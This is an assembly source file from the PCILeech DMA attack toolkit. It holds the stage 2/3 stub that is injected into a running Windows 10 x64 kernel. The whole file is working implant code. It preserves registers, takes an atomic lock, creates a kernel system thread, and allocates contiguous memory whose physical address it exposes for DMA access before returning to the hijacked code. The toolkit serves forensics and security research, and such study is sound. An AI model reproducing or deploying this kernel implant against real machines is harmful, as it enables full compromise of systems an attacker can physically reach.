; wx64_stage23_vmm3.asm : assembly for the WIN10_X64_3 KMD inject.
;
; (c) Ulf Frisk, 2020
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN stage3_c_EntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 0: INITIAL OP AND VARIABLE MEMORY LOCATIONS
	; ----------------------------------------------------
	JMP main_start 
	data_filler						db 00h, 00h				; +002
	original_code:
	data_original_code				dd 44444444h, 44444444h, 44444444h, 44444444h, 44444444h	; +004
	addr_data						dq 1111111111111111h	; +018
	pfnKeGetCurrentIrql				dq 1111111111111111h	; +020
	pfnPsCreateSystemThread			dq 1111111111111111h	; +028
	pfnZwClose						dq 1111111111111111h	; +030
	pfnMmAllocateContiguousMemory	dq 1111111111111111h	; +038
	pfnMmGetPhysicalAddress			dq 1111111111111111h	; +040
	addr_KernelBase					dq 1111111111111111h	; +048
	; ----------------------------------------------------
	; 1: SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
main_start:
	PUSH rcx
	PUSH rdx
	PUSH r8
	PUSH r9
	PUSH r10
	PUSH r11
	PUSH r12
	PUSH r13
	PUSH r14
	PUSH r15
	PUSH rdi
	PUSH rsi
	PUSH rbx
	PUSH rbp
	SUB rsp, 020h
	; ----------------------------------------------------
	; CHECK CURRENT IRQL - ONLY IRQL PASSIVE (0) ALLOWED
	; ----------------------------------------------------
	CALL [pfnKeGetCurrentIrql]
	TEST rax, rax
	JNZ skipcall
	; ----------------------------------------------------
	; ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	MOV rcx, addr_data
	LOCK CMPXCHG [rcx], dl
	JNE skipcall
	; ----------------------------------------------------
	; CREATE THREAD
	; ----------------------------------------------------
	PUSH r12					; StartContext
	LEA rax, setup2
	PUSH rax					; StartRoutine
	PUSH 0						; ClientId
	SUB rsp, 020h				; (stack shadow space)
	XOR r9, r9					; ProcessHandle
	XOR r8, r8					; ObjectAttributes
	MOV rdx, 1fffffh			; DesiredAccess
	MOV rcx, addr_data			; ThreadHandle
	ADD rcx, 8
	CALL [pfnPsCreateSystemThread]
	ADD rsp, 038h
	; ----------------------------------------------------
	; CLOSE THREAD HANDLE
	; ----------------------------------------------------
	SUB rsp, 038h				; (stack shadow space + align)
	MOV rcx, addr_data			; ThreadHandle
	MOV rcx, [rcx+8]
	CALL [pfnZwClose]
	ADD rsp, 038h
	; ----------------------------------------------------
	; EXIT - RESTORE AND JMP BACK
	; ----------------------------------------------------
skipcall:
	ADD rsp, 020h
	POP rbp
	POP rbx
	POP rsi
	POP rdi
	POP r15
	POP r14
	POP r13
	POP r12
	POP r11
	POP r10
	POP r9
	POP r8
	POP rdx
	POP rcx
	JMP original_code
main ENDP

; ----------------------------------------------------
; New Thread entry point. Allocate memory and write back
; the physical address so PCILeech may read it with DMA.
; ----------------------------------------------------
setup2 PROC
	; ----------------------------------------------------
	; SET UP STACK SHADOW SPACE (REQUIRED FOR SOME FUNCTION CALLS)
	; ----------------------------------------------------
	PUSH rbp
	MOV rbp, rsp
	SUB rsp, 020h
	; ----------------------------------------------------
	; ALLOCATE 0x1000 CONTIGUOUS MEMORY BELOW 0x7fffffff
	; ----------------------------------------------------
	MOV rcx, 1000h
	MOV rdx, 7fffffffh
	CALL [pfnMmAllocateContiguousMemory]
	MOV r13, rax
	; ----------------------------------------------------
	; ZERO ALLOCATED MEMORY
	; ----------------------------------------------------
	XOR rax, rax
	MOV ecx, 200h
	clear_loop:
	DEC ecx
	MOV [r13+rcx*8], rax
	JNZ clear_loop
	; ----------------------------------------------------
	; WRITE PHYSICAL MEMORY ADDRESS
	; ----------------------------------------------------
	MOV rcx, r13
	CALL [pfnMmGetPhysicalAddress]
	MOV rcx, addr_data
	MOV [rcx+01ch], eax
	; ----------------------------------------------------
	; SET PKMDDATA->AddrKernelBase
	; ----------------------------------------------------
	MOV rax, addr_KernelBase
	MOV [r13+8], rax
	; ----------------------------------------------------
	; CALL C-ENTRYPOINT
	; ----------------------------------------------------
	MOV rcx, r13
	CALL stage3_c_EntryPoint
	; ----------------------------------------------------
	; RETURN
	; ----------------------------------------------------
	ADD rsp, 028h
	XOR rax, rax
	RET
setup2 ENDP

END
